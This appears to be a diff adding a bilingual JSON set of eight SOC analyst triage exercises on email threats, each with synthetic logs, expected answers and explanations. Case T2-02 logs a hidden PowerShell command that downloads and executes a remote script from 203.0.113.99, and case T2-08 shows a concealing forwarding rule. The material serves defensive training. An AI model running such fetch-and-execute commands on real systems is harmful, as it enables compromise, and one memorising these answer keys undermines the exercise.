@@ -1,0 +1,240 @@
+{
+  "id": "T2",
+  "dia": { "es": "Martes", "en": "Tuesday" },
+  "tema": { "es": "Correo y suplantación", "en": "Email and impersonation" },
+  "casos": [
+    {
+      "id": "T2-01",
+      "hora": "08:15",
+      "sev": "media",
+      "fuente": "Correo",
+      "regla": { "es": "Correo reportado por un usuario", "en": "User-reported email" },
+      "titulo": { "es": "«Factura pendiente» con enlace a una página de acceso", "en": "«Pending invoice» with a link to a sign-in page" },
+      "resumen": { "es": "j.romero reporta un correo sospechoso con el botón «Notificar phishing».", "en": "j.romero reports a suspicious email with the «Report phishing» button." },
+      "logs": [
+        ["07:52:10", "mail", "delivered from=facturacion@nortelogistica-pagos.example to=j.romero@nortelogistica.example subject='Factura pendiente 2026-1187' spf=pass dkim=none url=https://nortelogistica-pagos.example/login"],
+        ["07:52:10", "mail", "delivered from=facturacion@nortelogistica-pagos.example to=m.ortega@nortelogistica.example subject='Factura pendiente 2026-1187' spf=pass dkim=none"],
+        ["07:52:11", "mail", "delivered from=facturacion@nortelogistica-pagos.example to=p.sanz@nortelogistica.example subject='Factura pendiente 2026-1187' spf=pass dkim=none"],
+        ["08:13:47", "mail", "user_report reporter=j.romero message_id=<a81f@nortelogistica-pagos.example> category=phishing"],
+        ["08:14:02", "whois", "nortelogistica-pagos.example creado hace 2 dias · registrador anonimo"],
+        ["08:14:30", "proxy01", "busqueda nortelogistica-pagos.example ultimas 24h: 0 visitas"]
+      ],
+      "ruido": { "fuentes": ["mail", "proxy"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "dominio", "label": { "es": "Dominio malicioso", "en": "Malicious domain" }, "ok": ["nortelogistica-pagos.example"] },
+        { "id": "destinatarios", "label": { "es": "Número de destinatarios", "en": "Number of recipients" }, "ok": ["3", "tres", "three"] }
+      ],
+      "mitre": "T1566.002",
+      "claves": ["nortelogistica-pagos.example", "3"],
+      "competencias": ["triaje", "correo", "respuesta"],
+      "explica": {
+        "es": "Dominio parecido al de la empresa, creado hace dos días y con página de acceso: es phishing de credenciales. Nadie ha hecho clic (0 visitas en el proxy), pero el correo sigue en tres buzones. Contener aquí es purgar los tres mensajes y bloquear el dominio en correo y proxy; se agradece el reporte a j.romero.",
+        "en": "A lookalike domain registered two days ago with a sign-in page: credential phishing. Nobody clicked (0 proxy visits), but the email is still in three mailboxes. Containing here means purging the three messages and blocking the domain in mail and proxy; thank j.romero for reporting."
+      }
+    },
+    {
+      "id": "T2-02",
+      "hora": "09:05",
+      "sev": "critica",
+      "fuente": "EDR",
+      "regla": { "es": "Office lanza un intérprete de comandos", "en": "Office spawns a script interpreter" },
+      "titulo": { "es": "Excel abre PowerShell en un equipo de Finanzas", "en": "Excel launches PowerShell on a Finance PC" },
+      "resumen": { "es": "EXCEL.EXE es el proceso padre de powershell.exe en PC-FIN-003.", "en": "EXCEL.EXE is the parent of powershell.exe on PC-FIN-003." },
+      "logs": [
+        ["08:58:30", "mail", "delivered from=pedidos@transportes-norba.example to=m.ortega@nortelogistica.example subject='Pedido 8841' attachment=Pedido_8841.xlsm spf=fail dkim=none"],
+        ["09:03:12", "edr", "process=EXCEL.EXE parent=OUTLOOK.EXE user=m.ortega host=PC-FIN-003 file=Pedido_8841.xlsm"],
+        ["09:03:19", "edr", "process=powershell.exe parent=EXCEL.EXE user=m.ortega host=PC-FIN-003 cmd='powershell -w hidden -c iwr http://203.0.113.99/s.ps1 | iex'"],
+        ["09:03:20", "fw01", "ALLOW tcp 10.20.3.33:51877 -> 203.0.113.99:80"],
+        ["09:03:25", "edr", "network host=PC-FIN-003 process=powershell.exe dst=203.0.113.99:443 bytes_out=2.1KB interval=30s"]
+      ],
+      "ruido": { "fuentes": ["edr", "fw", "mail"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "equipo", "label": { "es": "Equipo afectado", "en": "Affected host" }, "ok": ["PC-FIN-003"] },
+        { "id": "c2", "label": { "es": "IP a la que llama", "en": "IP it calls out to" }, "ok": ["203.0.113.99"] }
+      ],
+      "mitre": "T1566.001",
+      "claves": ["PC-FIN-003", "203.0.113.99", "xlsm"],
+      "competencias": ["triaje", "correo", "endpoint", "respuesta"],
+      "explica": {
+        "es": "Un adjunto con macros de un remitente que falla SPF abre PowerShell oculto, descarga un script y empieza a llamar cada 30 segundos a 203.0.113.99. El equipo está comprometido: se aísla desde el EDR, se bloquea la IP y se escala como incidente. Apunta la IP: volverá a salir.",
+        "en": "A macro attachment from a sender failing SPF opens hidden PowerShell, downloads a script and starts calling 203.0.113.99 every 30 seconds. The host is compromised: isolate it from the EDR, block the IP and escalate as an incident. Write the IP down: it will come back."
+      }
+    },
+    {
+      "id": "T2-03",
+      "hora": "09:50",
+      "sev": "baja",
+      "fuente": "Correo",
+      "regla": { "es": "Fallo de SPF en remitente conocido", "en": "SPF failure from a known sender" },
+      "titulo": { "es": "Un proveedor habitual llega con SPF fallido", "en": "A regular supplier arrives with failed SPF" },
+      "resumen": { "es": "El correo mensual de Transportes Ibarra falla SPF desde ayer.", "en": "Transportes Ibarra's monthly email fails SPF since yesterday." },
+      "logs": [
+        ["09:46:02", "mail", "delivered from=admin@transportes-ibarra.example to=p.sanz@nortelogistica.example subject='Liquidacion octubre' spf=softfail dkim=pass(d=transportes-ibarra.example) dmarc=pass(dkim) attachment=liquidacion_octubre.pdf"],
+        ["09:46:03", "sandbox", "liquidacion_octubre.pdf verdict=clean macros=none links=0"],
+        ["09:46:05", "mail", "historico remitente: 14 correos en 12 meses, mismo asunto mensual"],
+        ["09:46:10", "dns", "SPF transportes-ibarra.example: v=spf1 include:_spf.anterior-proveedor.example -all (no incluye el nuevo servidor 192.0.2.140)"]
+      ],
+      "ruido": { "fuentes": ["mail", "dns"], "n": 12 },
+      "veredicto": "benigno",
+      "accion": "cerrar",
+      "campos": [
+        { "id": "mecanismo", "label": { "es": "Mecanismo que sí valida el remitente", "en": "Mechanism that does validate the sender" }, "ok": ["dkim"] }
+      ],
+      "mitre": null,
+      "claves": ["dkim", "spf"],
+      "competencias": ["triaje", "correo", "comunicacion"],
+      "explica": {
+        "es": "DKIM firma con el dominio del proveedor y DMARC pasa gracias a esa firma; el PDF está limpio y el envío es el habitual. El SPF falla porque el proveedor cambió de servidor de correo y no actualizó su registro. Es benigno: se cierra y se avisa al proveedor para que corrija su SPF.",
+        "en": "DKIM signs with the supplier's domain and DMARC passes thanks to that signature; the PDF is clean and the sending pattern is the usual one. SPF fails because the supplier changed mail server and did not update its record. Benign: close it and tell the supplier to fix their SPF."
+      }
+    },
+    {
+      "id": "T2-04",
+      "hora": "10:30",
+      "sev": "alta",
+      "fuente": "Entra ID",
+      "regla": { "es": "Muchas solicitudes de MFA denegadas", "en": "Many denied MFA requests" },
+      "titulo": { "es": "Lluvia de notificaciones de MFA a un usuario", "en": "A burst of MFA pushes to one user" },
+      "resumen": { "es": "l.moreno recibe más de 10 solicitudes de aprobación en pocos minutos.", "en": "l.moreno gets more than 10 approval requests within minutes." },
+      "logs": [
+        ["10:21:05", "entra", "SignIn result=mfa_denied user=l.moreno@nortelogistica.example ip=198.51.100.140 geo=?,NL app=Office365"],
+        ["10:22:40", "entra", "SignIn result=mfa_denied user=l.moreno@nortelogistica.example ip=198.51.100.140 (x12 en 7m)"],
+        ["10:28:58", "entra", "SignIn result=mfa_denied user=l.moreno@nortelogistica.example ip=198.51.100.140"],
+        ["10:29:31", "entra", "SignIn result=success user=l.moreno@nortelogistica.example ip=198.51.100.140 mfa=approved_push device=unregistered"],
+        ["10:30:02", "entra", "AuditLog action='Register security info' user=l.moreno method=authenticator_app ip=198.51.100.140"]
+      ],
+      "ruido": { "fuentes": ["entra"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "ip", "label": { "es": "IP del atacante", "en": "Attacker IP" }, "ok": ["198.51.100.140"] },
+        { "id": "usuario", "label": { "es": "Cuenta afectada", "en": "Affected account" }, "ok": ["l.moreno"] }
+      ],
+      "mitre": "T1621",
+      "claves": ["198.51.100.140", "l.moreno", "mfa"],
+      "competencias": ["triaje", "identidad", "respuesta"],
+      "explica": {
+        "es": "El atacante ya tiene la contraseña y bombardea con notificaciones hasta que l.moreno aprueba una por cansancio. Después registra su propio método de MFA para quedarse. Se contiene ya: revocar sesiones, borrar el método registrado, forzar cambio de contraseña y bloquear la IP. Apunta 198.51.100.140.",
+        "en": "The attacker already has the password and spams pushes until l.moreno approves one out of fatigue. Then they register their own MFA method to stay. Contain now: revoke sessions, remove the new method, force a password reset and block the IP. Write down 198.51.100.140."
+      }
+    },
+    {
+      "id": "T2-05",
+      "hora": "11:10",
+      "sev": "media",
+      "fuente": "Entra ID",
+      "regla": { "es": "Consentimiento a aplicación con permisos de correo", "en": "Consent to an app with mail permissions" },
+      "titulo": { "es": "Un usuario autoriza una aplicación desconocida a leer su correo", "en": "A user lets an unknown app read their mail" },
+      "resumen": { "es": "p.sanz concede permisos a «PDF Converter Pro», editor no verificado.", "en": "p.sanz grants permissions to «PDF Converter Pro», unverified publisher." },
+      "logs": [
+        ["11:06:40", "proxy01", "user=p.sanz GET https://pdf-converter-pro.example/start 200"],
+        ["11:07:02", "entra", "AuditLog action='Consent to application' user=p.sanz app='PDF Converter Pro' publisher_verified=false scopes='Mail.Read Mail.Send offline_access' ip=192.0.2.1"],
+        ["11:08:15", "entra", "ServicePrincipalSignIn app='PDF Converter Pro' resource=Graph ip=203.0.113.210 result=success"],
+        ["11:08:16", "graph", "app='PDF Converter Pro' GET /users/p.sanz/messages?$top=500 status=200"]
+      ],
+      "ruido": { "fuentes": ["entra", "proxy"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "app", "label": { "es": "Aplicación", "en": "Application" }, "ok": ["PDF Converter Pro"] },
+        { "id": "permiso", "label": { "es": "Permiso de lectura concedido", "en": "Read permission granted" }, "ok": ["Mail.Read"] }
+      ],
+      "mitre": "T1528",
+      "claves": ["PDF Converter Pro", "Mail.Read"],
+      "competencias": ["triaje", "identidad", "correo", "respuesta"],
+      "explica": {
+        "es": "Un conversor de PDF no necesita leer ni enviar correo. Con «offline_access» la aplicación sigue entrando aunque p.sanz cambie la contraseña, y ya ha descargado 500 mensajes. Se contiene revocando el consentimiento y deshabilitando la aplicación; se escala para valorar qué datos salieron.",
+        "en": "A PDF converter has no need to read or send mail. With «offline_access» the app keeps access even if p.sanz changes her password, and it has already pulled 500 messages. Contain by revoking consent and disabling the app; escalate to assess what data left."
+      }
+    },
+    {
+      "id": "T2-06",
+      "hora": "12:00",
+      "sev": "baja",
+      "fuente": "Correo",
+      "regla": { "es": "Envío masivo desde un buzón interno", "en": "Mass mailing from an internal mailbox" },
+      "titulo": { "es": "Más de 4 000 correos salientes en una hora", "en": "Over 4,000 outbound emails in an hour" },
+      "resumen": { "es": "El buzón marketing@ supera el umbral de envíos.", "en": "The marketing@ mailbox exceeds the sending threshold." },
+      "logs": [
+        ["11:30:00", "itsm", "REQ-3307 aprobado: boletín de noviembre · plataforma envios.example · envío programado 11:45 · 4 800 destinatarios con consentimiento"],
+        ["11:45:02", "mail", "relay from=marketing@nortelogistica.example via=envios.example recipients=4800 subject='Novedades de noviembre' dkim=pass(d=nortelogistica.example)"],
+        ["11:58:40", "mail", "bounces=37 complaints=2 unsubscribes=11"]
+      ],
+      "ruido": { "fuentes": ["mail"], "n": 12 },
+      "veredicto": "benigno",
+      "accion": "cerrar",
+      "campos": [
+        { "id": "peticion", "label": { "es": "Petición que lo autoriza", "en": "Request that authorises it" }, "ok": ["REQ-3307"] },
+        { "id": "plataforma", "label": { "es": "Plataforma de envío", "en": "Sending platform" }, "ok": ["envios.example"] }
+      ],
+      "mitre": null,
+      "claves": ["REQ-3307", "envios.example"],
+      "competencias": ["triaje", "correo", "comunicacion"],
+      "explica": {
+        "es": "Coinciden la petición aprobada, la plataforma, la hora y el número de destinatarios, y el correo va firmado con DKIM de la empresa. Es el boletín mensual: benigno. Se cierra con REQ-3307 y se sugiere que marketing avise antes al SOC.",
+        "en": "The approved request, platform, time and recipient count all match, and the mail is DKIM-signed by the company. It is the monthly newsletter: benign. Close with REQ-3307 and suggest marketing gives the SOC a heads-up next time."
+      }
+    },
+    {
+      "id": "T2-07",
+      "hora": "12:45",
+      "sev": "alta",
+      "fuente": "Correo",
+      "regla": { "es": "Posible fraude del CEO", "en": "Possible CEO fraud" },
+      "titulo": { "es": "El «director» pide una transferencia urgente", "en": "The «director» asks for an urgent transfer" },
+      "resumen": { "es": "Correo a Finanzas con palabras clave de urgencia y cambio de cuenta bancaria.", "en": "Email to Finance with urgency keywords and a bank account change." },
+      "logs": [
+        ["12:38:20", "mail", "delivered from='David Vela' <d.vela@norte-logistica.example> to=p.sanz@nortelogistica.example subject='Urgente y confidencial' spf=pass dkim=pass(d=norte-logistica.example) body_kw='transferencia,hoy,nuevo IBAN,no comentes'"],
+        ["12:41:05", "mail", "sent from=p.sanz@nortelogistica.example to=d.vela@norte-logistica.example subject='RE: Urgente y confidencial' body='Lo preparo ahora mismo'"],
+        ["12:43:00", "whois", "norte-logistica.example creado hace 6 dias"],
+        ["12:43:10", "ad", "d.vela@nortelogistica.example (director general) · agenda: en vuelo Madrid-Ciudad de Mexico hasta las 21:00"]
+      ],
+      "ruido": { "fuentes": ["mail"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "escalar",
+      "campos": [
+        { "id": "dominio", "label": { "es": "Dominio suplantador", "en": "Impersonating domain" }, "ok": ["norte-logistica.example"] },
+        { "id": "victima", "label": { "es": "Persona a la que piden la transferencia", "en": "Person asked to make the transfer" }, "ok": ["p.sanz"] }
+      ],
+      "mitre": "T1656",
+      "claves": ["norte-logistica.example", "p.sanz", "transferencia"],
+      "competencias": ["triaje", "correo", "comunicacion"],
+      "explica": {
+        "es": "El dominio lleva un guion que el real no tiene y se creó hace seis días; el director está volando. SPF y DKIM pasan porque el atacante controla su propio dominio: pasar la autenticación no significa que sea legítimo. Lo urgente no es técnico: escalar ya para que Finanzas pare la transferencia por teléfono y bloquear el dominio.",
+        "en": "The domain has a hyphen the real one lacks and was registered six days ago; the director is on a plane. SPF and DKIM pass because the attacker controls their own domain: passing authentication does not make it legitimate. The urgent part is not technical: escalate now so Finance stops the transfer by phone, and block the domain."
+      }
+    },
+    {
+      "id": "T2-08",
+      "hora": "14:20",
+      "sev": "alta",
+      "fuente": "Correo",
+      "regla": { "es": "Regla de reenvío a dominio externo", "en": "Forwarding rule to an external domain" },
+      "titulo": { "es": "Un buzón de Finanzas reenvía todo a una dirección externa", "en": "A Finance mailbox forwards everything to an external address" },
+      "resumen": { "es": "Se crea una regla de bandeja de entrada en el buzón de m.ortega.", "en": "An inbox rule is created on m.ortega's mailbox." },
+      "logs": [
+        ["14:16:02", "entra", "SignIn result=success user=m.ortega@nortelogistica.example app=OWA ip=203.0.113.99 device=unknown"],
+        ["14:17:30", "exchange", "New-InboxRule mailbox=m.ortega name='.' ForwardTo=m.ortega.personal@correo.example DeleteMessage=True ip=203.0.113.99"],
+        ["14:18:00", "exchange", "forwarded messages=3 to=m.ortega.personal@correo.example"]
+      ],
+      "ruido": { "fuentes": ["entra", "mail"], "n": 12 },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        { "id": "destino", "label": { "es": "Dirección de destino", "en": "Destination address" }, "ok": ["m.ortega.personal@correo.example"] },
+        { "id": "ip", "label": { "es": "IP desde la que se crea", "en": "IP it was created from" }, "ok": ["203.0.113.99"] }
+      ],
+      "mitre": "T1114.003",
+      "claves": ["203.0.113.99", "m.ortega.personal@correo.example"],
+      "competencias": ["triaje", "correo", "identidad", "respuesta"],
+      "explica": {
+        "es": "La IP es la misma del C2 del adjunto con macros de esta mañana (T2-02): el atacante robó la sesión de m.ortega y ahora se queda con su correo. La regla se llama «.» y borra los originales para que no se note. Contener: eliminar la regla, revocar sesiones y cambiar la contraseña, y enlazar este ticket con el de T2-02.",
+        "en": "The IP is the same C2 from this morning's macro attachment (T2-02): the attacker stole m.ortega's session and is now taking her mail. The rule is named «.» and deletes the originals so nobody notices. Contain: delete the rule, revoke sessions, reset the password, and link this ticket to T2-02."
+      }
+    }
+  ]
+}
